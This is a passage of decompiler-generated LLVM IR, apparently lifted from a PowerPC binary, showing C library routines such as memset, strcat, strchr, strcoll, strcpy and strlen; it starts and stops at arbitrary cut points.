  uselistorder i32 %v1_1000e5f0, { 1, 0 }
  uselistorder i32 %v3_1000e5ec, { 1, 2, 0 }
  uselistorder i32 %v1_1000e5bc, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000e5b8, { 1, 0 }
  uselistorder i32 %v2_1000e5b4, { 1, 2, 0 }
  uselistorder i32 %v1_1000e59c, { 1, 0 }
  uselistorder i32 %v1_1000e594, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_1000e5e8.dec_label_pc_1000e5e8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000e5d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e5bc, { 1, 0, 2 }
}

define i32 @__GI_memset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000e628 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_1000e628, i32* %r9.global-to-local, align 4
  %v4_1000e628 = icmp eq i32 %v1_1000e628, 0
  store i1 %v4_1000e628, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  %v1_1000e630 = add i32 %arg1, -4
  store i32 %v1_1000e630, i32* %r11.global-to-local, align 4
  %v1_1000e634 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_1000e638 = call i32 @__asm_rlwimi(i32 %v1_1000e634, i32 16, i32 0, i32 15)
  %v2_1000e638 = trunc i32 %v1_1000e638 to i8
  %v0_1000e63c = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000e63c, label %dec_label_pc_1000e660, label %dec_label_pc_1000e640

dec_label_pc_1000e640:                            ; preds = %entry
  %v0_1000e640 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e640 = urem i32 %v0_1000e640, 4
  %v3_1000e640 = icmp eq i32 %v1_1000e640, 0
  store i1 %v3_1000e640, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000e640, label %dec_label_pc_1000e640.dec_label_pc_1000e648_crit_edge, label %dec_label_pc_1000e690

dec_label_pc_1000e640.dec_label_pc_1000e648_crit_edge: ; preds = %dec_label_pc_1000e640
  %v0_1000e648.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e648

dec_label_pc_1000e648:                            ; preds = %dec_label_pc_1000e6a8.dec_label_pc_1000e648_crit_edge, %dec_label_pc_1000e640.dec_label_pc_1000e648_crit_edge
  %v0_1000e64c.pre = phi i32 [ %v0_1000e640, %dec_label_pc_1000e640.dec_label_pc_1000e648_crit_edge ], [ %v0_1000e64c.pre.pre, %dec_label_pc_1000e6a8.dec_label_pc_1000e648_crit_edge ]
  %v0_1000e648 = phi i32 [ %v0_1000e648.pre, %dec_label_pc_1000e640.dec_label_pc_1000e648_crit_edge ], [ %v1_1000e6a8, %dec_label_pc_1000e6a8.dec_label_pc_1000e648_crit_edge ]
  store i32 %v0_1000e648, i32* %ctr.global-to-local, align 4
  %v1_1000e650 = sext i8 %v2_1000e638 to i32
  br label %dec_label_pc_1000e64c

dec_label_pc_1000e64c:                            ; preds = %dec_label_pc_1000e64c, %dec_label_pc_1000e648
  %v0_1000e64c = phi i32 [ %v1_1000e658, %dec_label_pc_1000e64c ], [ %v0_1000e64c.pre, %dec_label_pc_1000e648 ]
  %v1_1000e64c = add i32 %v0_1000e64c, 4
  store i32 %v1_1000e64c, i32* %r9.global-to-local, align 4
  %v4_1000e650 = inttoptr i32 %v1_1000e64c to i32*
  store i32 %v1_1000e650, i32* %v4_1000e650, align 4
  %v2_1000e654 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000e654 = add i32 %v2_1000e654, 4
  %v4_1000e654 = inttoptr i32 %v3_1000e654 to i32*
  store i32 %v1_1000e650, i32* %v4_1000e654, align 4
  %v0_1000e658 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e658 = add i32 %v0_1000e658, 4
  store i32 %v1_1000e658, i32* %r11.global-to-local, align 4
  %v0_1000e65c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e65c = add i32 %v0_1000e65c, -1
  store i32 %v1_1000e65c, i32* %ctr.global-to-local, align 4
  %v2_1000e65c = icmp eq i32 %v1_1000e65c, 0
  br i1 %v2_1000e65c, label %dec_label_pc_1000e660, label %dec_label_pc_1000e64c

dec_label_pc_1000e660:                            ; preds = %dec_label_pc_1000e64c, %dec_label_pc_1000e6a8, %entry
  %v0_1000e660 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000e660 = urem i32 %v0_1000e660, 8
  store i32 %v1_1000e660, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000e660, 4
  br i1 %tmp, label %dec_label_pc_1000e674, label %dec_label_pc_1000e66c

dec_label_pc_1000e66c:                            ; preds = %dec_label_pc_1000e660
  %v1_1000e66c = sext i8 %v2_1000e638 to i32
  %v2_1000e66c = load i32, i32* %r11.global-to-local, align 4
  %v3_1000e66c = add i32 %v2_1000e66c, 4
  %v4_1000e66c = inttoptr i32 %v3_1000e66c to i32*
  store i32 %v1_1000e66c, i32* %v4_1000e66c, align 4
  store i32 %v3_1000e66c, i32* %r11.global-to-local, align 4
  %v0_1000e670 = load i32, i32* @r5, align 4
  %v1_1000e670 = add i32 %v0_1000e670, -4
  store i32 %v1_1000e670, i32* @r5, align 4
  br label %dec_label_pc_1000e674

dec_label_pc_1000e674:                            ; preds = %dec_label_pc_1000e660, %dec_label_pc_1000e66c
  %v0_1000e674 = phi i32 [ %v1_1000e660, %dec_label_pc_1000e660 ], [ %v1_1000e670, %dec_label_pc_1000e66c ]
  %v3_1000e674 = icmp eq i32 %v0_1000e674, 0
  %v0_1000e678 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e674, i32 %v0_1000e678)
  %v0_1000e67c = load i32, i32* @r5, align 4
  store i32 %v0_1000e67c, i32* %ctr.global-to-local, align 4
  %v0_1000e680 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e680 = add i32 %v0_1000e680, 3
  store i32 %v1_1000e680, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e684

dec_label_pc_1000e684:                            ; preds = %dec_label_pc_1000e684, %dec_label_pc_1000e674
  %v3_1000e684 = phi i32 [ %v4_1000e684, %dec_label_pc_1000e684 ], [ %v1_1000e680, %dec_label_pc_1000e674 ]
  %v4_1000e684 = add i32 %v3_1000e684, 1
  %v5_1000e684 = inttoptr i32 %v4_1000e684 to i8*
  store i8 %v2_1000e638, i8* %v5_1000e684, align 1
  store i32 %v4_1000e684, i32* %r9.global-to-local, align 4
  %v0_1000e688 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e688 = add i32 %v0_1000e688, -1
  store i32 %v1_1000e688, i32* %ctr.global-to-local, align 4
  %v2_1000e688 = icmp eq i32 %v1_1000e688, 0
  br i1 %v2_1000e688, label %dec_label_pc_1000e6b4, label %dec_label_pc_1000e684

dec_label_pc_1000e690:                            ; preds = %dec_label_pc_1000e640
  %v1_1000e690 = sub nsw i32 4, %v1_1000e640
  store i32 %v1_1000e690, i32* %ctr.global-to-local, align 4
  %v1_1000e698 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000e698 = sub i32 %v1_1000e698, %v1_1000e690
  store i32 %v2_1000e698, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000e69c

dec_label_pc_1000e69c:                            ; preds = %dec_label_pc_1000e69c, %dec_label_pc_1000e690
  %v3_1000e69c = phi i32 [ %v1_1000e6a0, %dec_label_pc_1000e69c ], [ %v0_1000e640, %dec_label_pc_1000e690 ]
  %v4_1000e69c = add i32 %v3_1000e69c, 4
  %v5_1000e69c = inttoptr i32 %v4_1000e69c to i8*
  store i8 %v2_1000e638, i8* %v5_1000e69c, align 1
  %v0_1000e6a0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e6a0 = add i32 %v0_1000e6a0, 1
  store i32 %v1_1000e6a0, i32* %r11.global-to-local, align 4
  %v0_1000e6a4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e6a4 = add i32 %v0_1000e6a4, -1
  store i32 %v1_1000e6a4, i32* %ctr.global-to-local, align 4
  %v2_1000e6a4 = icmp eq i32 %v1_1000e6a4, 0
  br i1 %v2_1000e6a4, label %dec_label_pc_1000e6a8, label %dec_label_pc_1000e69c

dec_label_pc_1000e6a8:                            ; preds = %dec_label_pc_1000e69c
  %v0_1000e6a8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000e6a8 = call i32 @__asm_rlwinm.(i32 %v0_1000e6a8, i32 29, i32 3, i32 31)
  store i32 %v1_1000e6a8, i32* %r9.global-to-local, align 4
  %v4_1000e6a8 = icmp eq i32 %v1_1000e6a8, 0
  store i1 %v4_1000e6a8, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000e6a8, label %dec_label_pc_1000e660, label %dec_label_pc_1000e6a8.dec_label_pc_1000e648_crit_edge

dec_label_pc_1000e6a8.dec_label_pc_1000e648_crit_edge: ; preds = %dec_label_pc_1000e6a8
  %v0_1000e64c.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e648

dec_label_pc_1000e6b4:                            ; preds = %dec_label_pc_1000e684
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000e6a8, { 1, 2, 0 }
  uselistorder i32 %v1_1000e6a4, { 1, 0 }
  uselistorder i32 %v1_1000e6a0, { 1, 0 }
  uselistorder i32 %v1_1000e688, { 1, 0 }
  uselistorder i32 %v4_1000e684, { 1, 2, 0 }
  uselistorder i32 %v1_1000e660, { 2, 1, 0 }
  uselistorder i32 %v1_1000e65c, { 1, 0 }
  uselistorder i32 %v1_1000e658, { 1, 0 }
  uselistorder i32 %v1_1000e640, { 1, 0 }
  uselistorder i32 %v0_1000e640, { 2, 1, 0 }
  uselistorder i8 %v2_1000e638, { 1, 2, 3, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000e674, { 1, 0 }
  uselistorder label %dec_label_pc_1000e660, { 1, 0, 2 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_1000e6bc

dec_label_pc_1000e6bc:                            ; preds = %dec_label_pc_1000e6bc, %entry
  %v0_1000e6bc = phi i32 [ %v1_1000e6c0, %dec_label_pc_1000e6bc ], [ %tmp, %entry ]
  %v1_1000e6bc = inttoptr i32 %v0_1000e6bc to i8*
  %v2_1000e6bc = load i8, i8* %v1_1000e6bc, align 1
  %v1_1000e6c0 = add i32 %v0_1000e6bc, 1
  %v3_1000e6c4 = icmp eq i8 %v2_1000e6bc, 0
  store i1 %v3_1000e6c4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000e6c4, label %dec_label_pc_1000e6cc, label %dec_label_pc_1000e6bc

dec_label_pc_1000e6cc:                            ; preds = %dec_label_pc_1000e6bc
  %v1_1000e6cc = add i32 %v0_1000e6bc, -1
  br label %dec_label_pc_1000e6d0

dec_label_pc_1000e6d0:                            ; preds = %dec_label_pc_1000e6d0, %dec_label_pc_1000e6cc
  %v2_1000e6dc = phi i32 [ %v3_1000e6dc, %dec_label_pc_1000e6d0 ], [ %v1_1000e6cc, %dec_label_pc_1000e6cc ]
  %v0_1000e6d0 = load i32, i32* @r4, align 4
  %v1_1000e6d0 = inttoptr i32 %v0_1000e6d0 to i8*
  %v2_1000e6d0 = load i8, i8* %v1_1000e6d0, align 1
  %v1_1000e6d4 = add i32 %v0_1000e6d0, 1
  store i32 %v1_1000e6d4, i32* @r4, align 4
  %v3_1000e6d8 = icmp eq i8 %v2_1000e6d0, 0
  store i1 %v3_1000e6d8, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e6dc = add i32 %v2_1000e6dc, 1
  %v4_1000e6dc = inttoptr i32 %v3_1000e6dc to i8*
  store i8 %v2_1000e6d0, i8* %v4_1000e6dc, align 1
  %v0_1000e6e0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e6e0, label %dec_label_pc_1000e6e4, label %dec_label_pc_1000e6d0

dec_label_pc_1000e6e4:                            ; preds = %dec_label_pc_1000e6d0
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v3_1000e6dc, { 1, 0 }
  uselistorder i32 %v0_1000e6bc, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000e6e8 = urem i32 %arg1, 256
  store i32 %v1_1000e6e8, i32* %r4.global-to-local, align 4
  %v0_1000e7082 = load i32, i32* @r3, align 4
  %v1_1000e7083 = urem i32 %v0_1000e7082, 4
  %v3_1000e7085 = icmp eq i32 %v1_1000e7083, 0
  br i1 %v3_1000e7085, label %dec_label_pc_1000e710, label %dec_label_pc_1000e6f0

dec_label_pc_1000e6f0:                            ; preds = %entry, %dec_label_pc_1000e704
  %v1_1000e6f4 = phi i32 [ %v0_1000e710.pre, %dec_label_pc_1000e704 ], [ %v1_1000e6e8, %entry ]
  %v0_1000e6f0 = phi i32 [ %v1_1000e704, %dec_label_pc_1000e704 ], [ %v0_1000e7082, %entry ]
  %v1_1000e6f0 = inttoptr i32 %v0_1000e6f0 to i8*
  %v2_1000e6f0 = load i8, i8* %v1_1000e6f0, align 1
  %v3_1000e6f0 = zext i8 %v2_1000e6f0 to i32
  %v4_1000e6f4 = icmp eq i32 %v3_1000e6f0, %v1_1000e6f4
  %v3_1000e6f8 = icmp eq i8 %v2_1000e6f0, 0
  %v0_1000e6fc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000e6f4, i32 %v0_1000e6fc)
  br i1 %v3_1000e6f8, label %dec_label_pc_1000e7e0, label %dec_label_pc_1000e704

dec_label_pc_1000e704:                            ; preds = %dec_label_pc_1000e6f0
  %v0_1000e704 = load i32, i32* @r3, align 4
  %v1_1000e704 = add i32 %v0_1000e704, 1
  store i32 %v1_1000e704, i32* @r3, align 4
  %v1_1000e708 = urem i32 %v1_1000e704, 4
  %v3_1000e708 = icmp eq i32 %v1_1000e708, 0
  %v0_1000e710.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000e708, label %dec_label_pc_1000e710, label %dec_label_pc_1000e6f0

dec_label_pc_1000e710:                            ; preds = %dec_label_pc_1000e704, %entry
  %v0_1000e72810 = phi i32 [ %v0_1000e7082, %entry ], [ %v1_1000e704, %dec_label_pc_1000e704 ]
  %v0_1000e710 = phi i32 [ %v1_1000e6e8, %entry ], [ %v0_1000e710.pre, %dec_label_pc_1000e704 ]
  %v1_1000e710 = mul i32 %v0_1000e710, 256
  %v2_1000e718 = or i32 %v1_1000e710, %v0_1000e710
  %v1_1000e720 = mul i32 %v2_1000e718, 65536
  %v2_1000e724 = or i32 %v1_1000e720, %v2_1000e718
  br label %dec_label_pc_1000e728

dec_label_pc_1000e728:                            ; preds = %dec_label_pc_1000e728, %dec_label_pc_1000e7dc, %dec_label_pc_1000e710
  %v0_1000e780 = phi i32 [ %v0_1000e72810, %dec_label_pc_1000e710 ], [ %v1_1000e72c, %dec_label_pc_1000e7dc ], [ %v1_1000e72c, %dec_label_pc_1000e728 ]
  %v1_1000e728 = inttoptr i32 %v0_1000e780 to i32*
  %v2_1000e728 = load i32, i32* %v1_1000e728, align 4
  %v1_1000e72c = add i32 %v0_1000e780, 4
  %v2_1000e734 = xor i32 %v2_1000e728, %v2_1000e724
  %v1_1000e738 = add i32 %v2_1000e728, 2130640639
  %v2_1000e740 = xor i32 %v1_1000e738, %v2_1000e728
  %v1_1000e744 = add i32 %v2_1000e734, 2130640639
  %v2_1000e748 = and i32 %v2_1000e740, -2130640640
  %v3_1000e748 = xor i32 %v2_1000e748, -2130640640
  %v2_1000e74c = xor i32 %v1_1000e744, %v2_1000e734
  %v2_1000e750 = and i32 %v2_1000e74c, -2130640640
  %v3_1000e750 = xor i32 %v2_1000e750, -2130640640
  %v1_1000e75c = add i32 %v0_1000e780, 1
  %tmp = or i32 %v3_1000e750, %v3_1000e748
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_1000e728, label %dec_label_pc_1000e768

dec_label_pc_1000e768:                            ; preds = %dec_label_pc_1000e728
  %v2_1000e768 = inttoptr i32 %v0_1000e780 to i8*
  %v3_1000e768 = load i8, i8* %v2_1000e768, align 1
  %v4_1000e768 = zext i8 %v3_1000e768 to i32
  %v1_1000e76c = add i32 %v0_1000e780, 2
  %v1_1000e770 = add i32 %v0_1000e780, 3
  %v4_1000e774 = icmp eq i32 %v4_1000e768, %v0_1000e710
  br i1 %v4_1000e774, label %dec_label_pc_1000e780, label %dec_label_pc_1000e788

dec_label_pc_1000e780:                            ; preds = %dec_label_pc_1000e768
  ret i32 %v0_1000e780

dec_label_pc_1000e788:                            ; preds = %dec_label_pc_1000e768
  %v3_1000e778 = icmp eq i8 %v3_1000e768, 0
  br i1 %v3_1000e778, label %dec_label_pc_1000e7e0, label %dec_label_pc_1000e78c

dec_label_pc_1000e78c:                            ; preds = %dec_label_pc_1000e788
  %v2_1000e78c = inttoptr i32 %v1_1000e75c to i8*
  %v3_1000e78c = load i8, i8* %v2_1000e78c, align 1
  %v4_1000e78c = zext i8 %v3_1000e78c to i32
  %v4_1000e790 = icmp eq i32 %v4_1000e78c, %v0_1000e710
  br i1 %v4_1000e790, label %dec_label_pc_1000e79c, label %dec_label_pc_1000e7a4

dec_label_pc_1000e79c:                            ; preds = %dec_label_pc_1000e78c
  ret i32 %v1_1000e75c

dec_label_pc_1000e7a4:                            ; preds = %dec_label_pc_1000e78c
  %v3_1000e794 = icmp eq i8 %v3_1000e78c, 0
  br i1 %v3_1000e794, label %dec_label_pc_1000e7e0, label %dec_label_pc_1000e7a8

dec_label_pc_1000e7a8:                            ; preds = %dec_label_pc_1000e7a4
  %v2_1000e7a8 = inttoptr i32 %v1_1000e76c to i8*
  %v3_1000e7a8 = load i8, i8* %v2_1000e7a8, align 1
  %v4_1000e7a8 = zext i8 %v3_1000e7a8 to i32
  %v4_1000e7ac = icmp eq i32 %v4_1000e7a8, %v0_1000e710
  br i1 %v4_1000e7ac, label %dec_label_pc_1000e7b8, label %dec_label_pc_1000e7c0

dec_label_pc_1000e7b8:                            ; preds = %dec_label_pc_1000e7a8
  ret i32 %v1_1000e76c

dec_label_pc_1000e7c0:                            ; preds = %dec_label_pc_1000e7a8
  %v3_1000e7b0 = icmp eq i8 %v3_1000e7a8, 0
  br i1 %v3_1000e7b0, label %dec_label_pc_1000e7e0, label %dec_label_pc_1000e7c4

dec_label_pc_1000e7c4:                            ; preds = %dec_label_pc_1000e7c0
  %v2_1000e7c4 = inttoptr i32 %v1_1000e770 to i8*
  %v3_1000e7c4 = load i8, i8* %v2_1000e7c4, align 1
  %v4_1000e7c4 = zext i8 %v3_1000e7c4 to i32
  %v4_1000e7c8 = icmp eq i32 %v4_1000e7c4, %v0_1000e710
  br i1 %v4_1000e7c8, label %dec_label_pc_1000e7d4, label %dec_label_pc_1000e7dc

dec_label_pc_1000e7d4:                            ; preds = %dec_label_pc_1000e7c4
  ret i32 %v1_1000e770

dec_label_pc_1000e7dc:                            ; preds = %dec_label_pc_1000e7c4
  %v3_1000e7cc = icmp eq i8 %v3_1000e7c4, 0
  br i1 %v3_1000e7cc, label %dec_label_pc_1000e7e0, label %dec_label_pc_1000e728

dec_label_pc_1000e7e0:                            ; preds = %dec_label_pc_1000e6f0, %dec_label_pc_1000e7dc, %dec_label_pc_1000e7c0, %dec_label_pc_1000e7a4, %dec_label_pc_1000e788
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000e72c, { 1, 0 }
  uselistorder i32 %v2_1000e728, { 0, 2, 1 }
  uselistorder i32 %v0_1000e780, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_1000e718, { 1, 0 }
  uselistorder i32 %v0_1000e710, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000e704, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000e7082, { 2, 1, 0 }
  uselistorder i32 %v1_1000e6e8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000e7e0, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000e728, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e6f0, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000e7f4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000e7ec

dec_label_pc_1000e7ec:                            ; preds = %dec_label_pc_1000e810, %entry
  %v0_1000e7f4 = phi i32 [ %v1_1000e7f8, %dec_label_pc_1000e810 ], [ %v0_1000e7f4.pre, %entry ]
  %v0_1000e7ec = phi i32 [ %v1_1000e7f0, %dec_label_pc_1000e810 ], [ %tmp, %entry ]
  %v1_1000e7ec = inttoptr i32 %v0_1000e7ec to i8*
  %v2_1000e7ec = load i8, i8* %v1_1000e7ec, align 1
  %v3_1000e7ec = zext i8 %v2_1000e7ec to i32
  %v1_1000e7f4 = inttoptr i32 %v0_1000e7f4 to i8*
  %v2_1000e7f4 = load i8, i8* %v1_1000e7f4, align 1
  %v3_1000e7f4 = zext i8 %v2_1000e7f4 to i32
  %v3_1000e7fc = icmp eq i8 %v2_1000e7ec, 0
  br i1 %v3_1000e7fc, label %dec_label_pc_1000e808, label %dec_label_pc_1000e810

dec_label_pc_1000e808:                            ; preds = %dec_label_pc_1000e7ec
  %v1_1000e808 = sub nsw i32 0, %v3_1000e7f4
  ret i32 %v1_1000e808

dec_label_pc_1000e810:                            ; preds = %dec_label_pc_1000e7ec
  %v4_1000e800 = icmp eq i8 %v2_1000e7ec, %v2_1000e7f4
  %v1_1000e7f8 = add i32 %v0_1000e7f4, 1
  %v1_1000e7f0 = add i32 %v0_1000e7ec, 1
  br i1 %v4_1000e800, label %dec_label_pc_1000e7ec, label %dec_label_pc_1000e814

dec_label_pc_1000e814:                            ; preds = %dec_label_pc_1000e810
  %v2_1000e814 = sub nsw i32 %v3_1000e7ec, %v3_1000e7f4
  ret i32 %v2_1000e814

; uselistorder directives
  uselistorder i32 %v3_1000e7f4, { 1, 0 }
  uselistorder i32 %v0_1000e7ec, { 1, 0 }
  uselistorder i32 %v0_1000e7f4, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_1000e81c = add i32 %arg1, -1
  %v1_1000e820 = sub i32 %v2_1000e81c, %tmp
  store i32 %v1_1000e820, i32* %r9.global-to-local, align 4
  %v2_1000e8244 = load i8, i8* %arg2, align 1
  %v1_1000e8286 = add i32 %tmp, 1
  store i32 %v1_1000e8286, i32* %r4.global-to-local, align 4
  %v3_1000e82c8 = icmp eq i8 %v2_1000e8244, 0
  store i1 %v3_1000e82c8, i1* %cr7_eq.global-to-local, align 1
  %v5_1000e8309 = inttoptr i32 %arg1 to i8*
  store i8 %v2_1000e8244, i8* %v5_1000e8309, align 1
  %v0_1000e83410 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e83410, label %dec_label_pc_1000e838, label %dec_label_pc_1000e824.dec_label_pc_1000e824_crit_edge

dec_label_pc_1000e824.dec_label_pc_1000e824_crit_edge: ; preds = %entry, %dec_label_pc_1000e824.dec_label_pc_1000e824_crit_edge
  %v0_1000e824.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_1000e830.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e824 = inttoptr i32 %v0_1000e824.pre to i8*
  %v2_1000e824 = load i8, i8* %v1_1000e824, align 1
  %v1_1000e828 = add i32 %v0_1000e824.pre, 1
  store i32 %v1_1000e828, i32* %r4.global-to-local, align 4
  %v3_1000e82c = icmp eq i8 %v2_1000e824, 0
  store i1 %v3_1000e82c, i1* %cr7_eq.global-to-local, align 1
  %v4_1000e830 = add i32 %v1_1000e828, %v2_1000e830.pre
  %v5_1000e830 = inttoptr i32 %v4_1000e830 to i8*
  store i8 %v2_1000e824, i8* %v5_1000e830, align 1
  %v0_1000e834 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e834, label %dec_label_pc_1000e838, label %dec_label_pc_1000e824.dec_label_pc_1000e824_crit_edge

dec_label_pc_1000e838:                            ; preds = %dec_label_pc_1000e824.dec_label_pc_1000e824_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e824.dec_label_pc_1000e824_crit_edge, { 1, 0 }
}

define i32 @__GI_strlen() local_unnamed_addr {
entry:
  %v0_1000e83c = load i32, i32* @r3, align 4
  %v1_1000e8543 = urem i32 %v0_1000e83c, 4
  %v3_1000e8545 = icmp eq i32 %v1_1000e8543, 0
  br i1 %v3_1000e8545, label %dec_label_pc_1000e85c, label %dec_label_pc_1000e844

dec_label_pc_1000e844:                            ; preds = %entry, %dec_label_pc_1000e850
  %v0_1000e850 = phi i32 [ %v1_1000e850, %dec_label_pc_1000e850 ], [ %v0_1000e83c, %entry ]
  %v1_1000e844 = inttoptr i32 %v0_1000e850 to i8*
  %v2_1000e844 = load i8, i8* %v1_1000e844, align 1
  %v3_1000e848 = icmp eq i8 %v2_1000e844, 0
  br i1 %v3_1000e848, label %dec_label_pc_1000e890, label %dec_label_pc_1000e850

dec_label_pc_1000e850:                            ; preds = %dec_label_pc_1000e844
  %v1_1000e850 = add i32 %v0_1000e850, 1
  %v1_1000e854 = urem i32 %v1_1000e850, 4
  %v3_1000e854 = icmp eq i32 %v1_1000e854, 0
  br i1 %v3_1000e854, label %dec_label_pc_1000e85c, label %dec_label_pc_1000e844

dec_label_pc_1000e85c:                            ; preds = %dec_label_pc_1000e850, %entry
  %v0_1000e860 = phi i32 [ %v0_1000e83c, %entry ], [ %v1_1000e850, %dec_label_pc_1000e850 ]
  store i32 -2139062144, i32* @r8, align 4
  br label %dec_label_pc_1000e868

dec_label_pc_1000e868:                            ; preds = %dec_label_pc_1000e8c8, %dec_label_pc_1000e868, %dec_label_pc_1000e85c
  %v1_1000e8a4 = phi i32 [ %v0_1000e860, %dec_label_pc_1000e85c ], [ %v1_1000e86c, %dec_label_pc_1000e868 ], [ %v1_1000e86c, %dec_label_pc_1000e8c8 ]
  %v1_1000e868 = inttoptr i32 %v1_1000e8a4 to i32*
  %v2_1000e868 = load i32, i32* %v1_1000e868, align 4
  %v1_1000e86c = add i32 %v1_1000e8a4, 4
  %v1_1000e878 = add i32 %v2_1000e868, -16843009
  %v2_1000e87c = and i32 %v1_1000e878, -2139062144
  %v5_1000e87c = icmp eq i32 %v2_1000e87c, 0
  br i1 %v5_1000e87c, label %dec_label_pc_1000e868, label %dec_label_pc_1000e884

dec_label_pc_1000e884:                            ; preds = %dec_label_pc_1000e868
  %v2_1000e884 = inttoptr i32 %v1_1000e8a4 to i8*
  %v3_1000e884 = load i8, i8* %v2_1000e884, align 1
  %v3_1000e888 = icmp eq i8 %v3_1000e884, 0
  br i1 %v3_1000e888, label %dec_label_pc_1000e890, label %dec_label_pc_1000e898

dec_label_pc_1000e890:                            ; preds = %dec_label_pc_1000e844, %dec_label_pc_1000e884
  %v1_1000e890 = phi i32 [ %v1_1000e8a4, %dec_label_pc_1000e884 ], [ %v0_1000e850, %dec_label_pc_1000e844 ]
  %v2_1000e890 = sub i32 %v1_1000e890, %v0_1000e83c
  ret i32 %v2_1000e890

dec_label_pc_1000e898:                            ; preds = %dec_label_pc_1000e884
  %v1_1000e898 = add i32 %v1_1000e8a4, 1
  %v2_1000e898 = inttoptr i32 %v1_1000e898 to i8*
  %v3_1000e898 = load i8, i8* %v2_1000e898, align 1
  %v3_1000e89c = icmp eq i8 %v3_1000e898, 0
  br i1 %v3_1000e89c, label %dec_label_pc_1000e8a4, label %dec_label_pc_1000e8b0

dec_label_pc_1000e8a4:                            ; preds = %dec_label_pc_1000e898
  %v2_1000e8a4 = sub i32 %v1_1000e8a4, %v0_1000e83c
  %v1_1000e8a8 = add i32 %v2_1000e8a4, 1
  ret i32 %v1_1000e8a8

dec_label_pc_1000e8b0:                            ; preds = %dec_label_pc_1000e898
